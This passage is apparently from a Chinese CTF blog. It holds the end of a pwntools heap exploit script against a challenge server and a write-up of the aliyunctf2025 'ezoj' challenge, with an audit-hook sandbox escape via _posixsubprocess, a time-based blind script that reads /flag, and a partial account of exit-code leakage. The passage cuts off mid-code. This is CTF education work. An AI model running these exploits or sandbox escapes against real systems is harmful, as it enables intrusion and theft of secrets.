class="hljs-string">&quot;pwn_patched&quot;</span><br>libcname = <span class="hljs-string">&quot;/home/zhangjuncpp/.config/cpwn/pkgs/2.31-0ubuntu9.16/amd64/libc6_2.31-0ubuntu9.16_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;node.vnteam.cn&quot;</span><br>port = <span class="hljs-number">46038</span><br>elf = context.binary = ELF(filename)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">set debug-file-directory /home/zhangjuncpp/.config/cpwn/pkgs/2.31-0ubuntu9.16/amd64/libc6-dbg_2.31-0ubuntu9.16_amd64/usr/lib/debug</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>+<span class="hljs-string">&quot;n\n&quot;</span>*<span class="hljs-number">20</span>+<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b *$rebase(0x1771)</span><br><span class="hljs-string">b *$rebase(0x15bf)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br>    <span class="hljs-keyword">elif</span> args.REMOTE:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br>menu = <span class="hljs-string">b&quot;Please select an option:\n&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    io.sendlineafter(menu, <span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;Enter customer ID:\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendlineafter(<span class="hljs-string">b&#x27;Enter allocated data size:\n&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(menu, <span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;Enter customer ID to remove:\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">offset</span>):<br>    io.sendlineafter(menu, <span class="hljs-string">b&quot;4&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;Enter customer ID to view:\n&quot;</span>, <span class="hljs-built_in">str</span>(offset).encode())<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, offset, data</span>):<br>    io.sendlineafter(menu, <span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&quot;Enter customer ID to update:\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendlineafter(<span class="hljs-string">b&quot;Enter data length:\n&quot;</span>, <span class="hljs-built_in">str</span>(offset).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;Enter updated customer details:\n&quot;</span>, data)<br><br><br>io = start()<br><br>show(-<span class="hljs-number">0x58</span>//<span class="hljs-number">8</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;Customer Profile:\n&quot;</span>)<br>base = u64(io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x4068</span><br>log.success(<span class="hljs-string">f&quot;base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(base)&#125;</span>&quot;</span>)<br>ptr = base + <span class="hljs-number">0x40c0</span> + <span class="hljs-number">0x10</span><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x20000</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20000</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20000</span>)<br><br>edit(<span class="hljs-number">1</span>, -<span class="hljs-number">0x10</span>, p64(<span class="hljs-number">0x20ff0</span>) +  p64(<span class="hljs-number">0x430</span>))  <span class="hljs-comment">#free p</span><br><br>edit(<span class="hljs-number">1</span>, -<span class="hljs-number">0x10</span>-<span class="hljs-number">0x20ff0</span>, p64(<span class="hljs-number">0x0</span>)+p64(<span class="hljs-number">0x20ff1</span>)) <span class="hljs-comment">#unlink p</span><br>edit(<span class="hljs-number">1</span>, -<span class="hljs-number">0x10</span>-<span class="hljs-number">0x20ff0</span>+<span class="hljs-number">0x10</span>, p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>))<br><br>edit(<span class="hljs-number">1</span>, -<span class="hljs-number">0x10</span>+<span class="hljs-number">0x430</span>, p64(<span class="hljs-number">0x430</span>)+p64(<span class="hljs-number">0x431</span>))<br>edit(<span class="hljs-number">1</span>, -<span class="hljs-number">0x10</span>+<span class="hljs-number">0x430</span>+<span class="hljs-number">0x430</span>, p64(<span class="hljs-number">0x430</span>)+p64(<span class="hljs-number">0x431</span>))<br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x20008</span>, p64(<span class="hljs-number">0xffffffdeadbee1</span>))<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># heap_list[2] = base + 0x40b8</span><br><br>edit(<span class="hljs-number">2</span>, (<span class="hljs-number">0x40c8</span>-<span class="hljs-number">0x40b8</span>), p64(base+<span class="hljs-number">0x4020</span>))<br>show(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;Customer Profile:\n&quot;</span>)<br>libc_base = u64(io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>log.success(<span class="hljs-string">f&quot;libc_base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><br>ogg = libc_base + [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>][<span class="hljs-number">1</span>]<br><br>edit(<span class="hljs-number">2</span>, (<span class="hljs-number">0x4050</span>-<span class="hljs-number">0x40b8</span>), p64(ogg))<br>io.sendlineafter(menu, <span class="hljs-string">b&quot;5&quot;</span>)<br><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>aliyunctf2025 ezoj 非预期解与官方题解复现</title>
    <link href="/2025/02/26/aliyunctf2025-ezoj-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/02/26/aliyunctf2025-ezoj-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ezoj"><a href="#ezoj" class="headerlink" title="ezoj"></a>ezoj</h1><p>这比赛的pwn全是kernel，我会不了一点，于是就去协助web手打web了。这题我们当时用的是时间盲注，后来发现官方题解更简单，所以复现并记录一下。</p><h4 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h4><p>网页最下面提示了源代码在&#x2F;source下，访问即可得到网页源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>app = Flask(__name__)<br><br>SUBMISSIONS_PATH = Path(<span class="hljs-string">&quot;./submissions&quot;</span>)<br>PROBLEMS_PATH = Path(<span class="hljs-string">&quot;./problems&quot;</span>)<br><br>SUBMISSIONS_PATH.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>CODE_TEMPLATE = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">import sys</span><br><span class="hljs-string">import math</span><br><span class="hljs-string">import collections</span><br><span class="hljs-string">import queue</span><br><span class="hljs-string">import heapq</span><br><span class="hljs-string">import bisect</span><br><span class="hljs-string"></span><br><span class="hljs-string">def audit_checker(event,args):</span><br><span class="hljs-string">    if not event in [&quot;import&quot;,&quot;time.sleep&quot;,&quot;builtins.input&quot;,&quot;builtins.input/result&quot;]:</span><br><span class="hljs-string">        raise RuntimeError</span><br><span class="hljs-string"></span><br><span class="hljs-string">sys.addaudithook(audit_checker)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OJTimeLimitExceed</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OJRuntimeError</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&quot;static/index.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/source&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&quot;server.py&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/api/problems&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_problems</span>():<br>    problems_dir = PROBLEMS_PATH<br>    problems = []<br>    <span class="hljs-keyword">for</span> problem <span class="hljs-keyword">in</span> problems_dir.iterdir():<br>        problem_config_file = problem / <span class="hljs-string">&quot;problem.json&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> problem_config_file.exists():<br>            <span class="hljs-keyword">continue</span><br><br>        problem_config = json.load(problem_config_file.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r&quot;</span>))<br>        problem = &#123;<br>            <span class="hljs-string">&quot;problem_id&quot;</span>: problem.name,<br>            <span class="hljs-string">&quot;name&quot;</span>: problem_config[<span class="hljs-string">&quot;name&quot;</span>],<br>            <span class="hljs-string">&quot;description&quot;</span>: problem_config[<span class="hljs-string">&quot;description&quot;</span>],<br>        &#125;<br>        problems.append(problem)<br><br>    problems = <span class="hljs-built_in">sorted</span>(problems, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&quot;problem_id&quot;</span>])<br><br>    problems = &#123;<span class="hljs-string">&quot;problems&quot;</span>: problems&#125;<br>    <span class="hljs-keyword">return</span> jsonify(problems), <span class="hljs-number">200</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/api/submit&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_code</span>():<br>    <span class="hljs-keyword">try</span>:<br>        data = request.get_json()<br>        code = data.get(<span class="hljs-string">&quot;code&quot;</span>)<br>        problem_id = data.get(<span class="hljs-string">&quot;problem_id&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> code <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> problem_id <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> (<br>                jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ER&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Missing &#x27;code&#x27; or &#x27;problem_id&#x27;&quot;</span>&#125;),<br>                <span class="hljs-number">400</span>,<br>            )<br><br>        problem_id = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(problem_id))<br>        problem_dir = PROBLEMS_PATH / problem_id<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> problem_dir.exists():<br>            <span class="hljs-keyword">return</span> (<br>                jsonify(<br>                    &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ER&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Problem ID <span class="hljs-subst">&#123;problem_id&#125;</span> not found!&quot;</span>&#125;<br>                ),<br>                <span class="hljs-number">404</span>,<br>            )<br><br>        code_filename = SUBMISSIONS_PATH / <span class="hljs-string">f&quot;submission_<span class="hljs-subst">&#123;uuid.uuid4()&#125;</span>.py&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(code_filename, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> code_file:<br>            code = CODE_TEMPLATE + code<br>            code_file.write(code)<br><br>        result = judge(code_filename, problem_dir)<br><br>        code_filename.unlink()<br><br>        <span class="hljs-keyword">return</span> jsonify(result)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ER&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">judge</span>(<span class="hljs-params">code_filename, problem_dir</span>):<br>    test_files = <span class="hljs-built_in">sorted</span>(problem_dir.glob(<span class="hljs-string">&quot;*.input&quot;</span>))<br>    total_tests = <span class="hljs-built_in">len</span>(test_files)<br>    passed_tests = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">for</span> test_file <span class="hljs-keyword">in</span> test_files:<br>            input_file = test_file<br>            expected_output_file = problem_dir / <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;test_file.stem&#125;</span>.output&quot;</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> expected_output_file.exists():<br>                <span class="hljs-keyword">continue</span><br><br>            case_passed = run_code(code_filename, input_file, expected_output_file)<br><br>            <span class="hljs-keyword">if</span> case_passed:<br>                passed_tests += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> passed_tests == total_tests:<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;AC&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Accepted&quot;</span>&#125;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;WA&quot;</span>,<br>                <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Wrang Answer: pass(<span class="hljs-subst">&#123;passed_tests&#125;</span>/<span class="hljs-subst">&#123;total_tests&#125;</span>)&quot;</span>,<br>            &#125;<br>    <span class="hljs-keyword">except</span> OJRuntimeError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;RE&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Runtime Error: ret=<span class="hljs-subst">&#123;e.args[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>&#125;<br>    <span class="hljs-keyword">except</span> OJTimeLimitExceed:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;TLE&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Time Limit Exceed&quot;</span>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_code</span>(<span class="hljs-params">code_filename, input_file, expected_output_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> infile, <span class="hljs-built_in">open</span>(<br>        expected_output_file, <span class="hljs-string">&quot;r&quot;</span><br>    ) <span class="hljs-keyword">as</span> expected_output:<br>        expected_output_content = expected_output.read().strip()<br><br>        process = subprocess.Popen(<br>            [<span class="hljs-string">&quot;python3&quot;</span>, code_filename],<br>            stdin=infile,<br>            stdout=subprocess.PIPE,<br>            stderr=subprocess.PIPE,<br>            text=<span class="hljs-literal">True</span>,<br>        )<br><br>        <span class="hljs-keyword">try</span>:<br>            stdout, stderr = process.communicate(timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>            process.kill()<br>            <span class="hljs-keyword">raise</span> OJTimeLimitExceed<br><br>        <span class="hljs-keyword">if</span> process.returncode != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> OJRuntimeError(process.returncode)<br><br>        <span class="hljs-keyword">if</span> stdout.strip() == expected_output_content:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>通过分析源码和抓包可以看出：</p><ol><li>程序通过<code>/api/submit</code>接收一个POST请求，执行请求中的代码</li><li>代码被拼接到<code>CODE_TEMPLATE</code>后执行，并且有白名单沙箱限制调用</li></ol><p>这里考虑沙箱逃逸。Python中有比题给的沙箱更底层的调用<code>_posixsubprocess</code>，它不会被监控，可以尝试用它执行命令。</p><h4 id="非预期解-时间盲注"><a href="#非预期解-时间盲注" class="headerlink" title="非预期解(时间盲注)"></a>非预期解(时间盲注)</h4><p>网上很容易查到<code>_posixsubprocess</code>执行任意命令的板子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> _posixsubprocess<br>cmd = <span class="hljs-string">b&#x27;&#x27;</span><br>_posixsubprocess.fork_exec([<span class="hljs-string">b&quot;/bin/sh&quot;</span>,  <span class="hljs-string">b&quot;-c&quot;</span> , cmd], [<span class="hljs-string">b&quot;/bin/sh&quot;</span>], <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, *(os.pipe()), <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>现在的问题是，程序没有回显，且不出网无法反弹shell。我们要想办法搞出命令的回显才行。我们在比赛时的第一反应是<strong>时间盲注</strong>。<br>时间盲注的大概原理是，用一个合适大小的字符集匹配某个字节流中的字符，若匹配不成功则pass，匹配成功则让程序停止(sleep)一段时间再相应，那么通过相应时间就可以推断字节流的内容，拿到flag。这实际上就是<strong>将时间解释为输出</strong>的方法。<br>知道原理之后就好写脚本了。这个脚本应该还能优化成二分查找，但我们比较懒，没优化()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&quot;http://121.41.238.106:29330/api/submit&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;problem_id&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;import os\nimport _posixsubprocess\n\n_posixsubprocess.fork_exec([b\&quot;/bin/sh\&quot;,  b\&quot;-c\&quot; , b\&quot;\&quot;\&quot;chr=$(cat /flag* | cut -c&#123;j&#125;)\nif [ \&quot;$chr\&quot; = \&quot;&#123;index&#125;\&quot; ]; then\t\nsleep 0.3\nfi\&quot;\&quot;\&quot;], [b\&quot;/bin/sh\&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), 2, False,False, None, None, None, -1, None, False)&quot;</span><br>&#125;<br><br>result = <span class="hljs-string">&quot;&quot;</span><br>charset = <span class="hljs-string">&quot;abcdef-&#123;&#125;liyunt0123456789&quot;</span><br><span class="hljs-built_in">print</span>(charset)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>    getit = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(charset)):      <br>        data1 = data.copy()<br>        data1[<span class="hljs-string">&quot;code&quot;</span>] = data[<span class="hljs-string">&quot;code&quot;</span>].<span class="hljs-built_in">format</span>(j=j,index=charset[i])<br>        start_time = time.monotonic()<br>        res = requests.post(url=url,json=data1)<br><br>        <span class="hljs-comment"># print(f&quot;now&gt;&gt;&gt;&#123;j&#125;::&#123;charset[i]&#125;&quot;, f&quot;time=&#123;time.monotonic() - start_time&#125;&quot;)</span><br>        <br>        <span class="hljs-keyword">if</span> time.monotonic() - start_time &gt; <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">if</span> getit:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;j&#125;</span>::<span class="hljs-subst">&#123;charset[i]&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">continue</span><br>            result += charset[i]<br>            <span class="hljs-built_in">print</span>(result)<br>            getit = <span class="hljs-literal">True</span><br>            <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> getit:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;&gt;&gt; <span class="hljs-subst">&#123;j&#125;</span> is failed&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="预期解复现"><a href="#预期解复现" class="headerlink" title="预期解复现"></a>预期解复现</h4><p>参考官方题解：<a href="https://xz.aliyun.com/news/17029">https://xz.aliyun.com/news/17029</a><br>官方题解用另一种方法解决了回显问题。当提交的代码运行失败或异常退出时，网页会回显<strong>退出码</strong>。而退出码恰好是0~255，即一个字节。<br><img src="/aliyunctf2025-ezoj-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3%E5%A4%8D%E7%8E%B0/image.png"><br>那么现在的问题就是，<code>_posixsubprocess</code>执行命令时显然是exec了一个子进程执行，执行命令的输出是子进程的<code>stdout</code>，我们怎么在父进程获取这个输出呢？<br>这就需要看一下<code>_posixsubprocess</code>的细节用法了。网上几乎查不到相关接口，我们只能去看源码了。源码：<a href="https://github.com/python/cpython.git">https://github.com/python/cpython.git</a><br>在源码的&#x2F;Modules文件夹下的<code>_posixsubprocess.c</code>我们可以看到这个函数的源码。它进行了多层预处理，最终调用<code>child_exec</code>函数执行exec。注意722行的这些代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (c2pwrite == <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">if</span> (_Py_set_inheritable_async_safe(c2pwrite, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">goto</span> error;<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c2pwrite != <span class="hljs-number">-1</span>)<br>    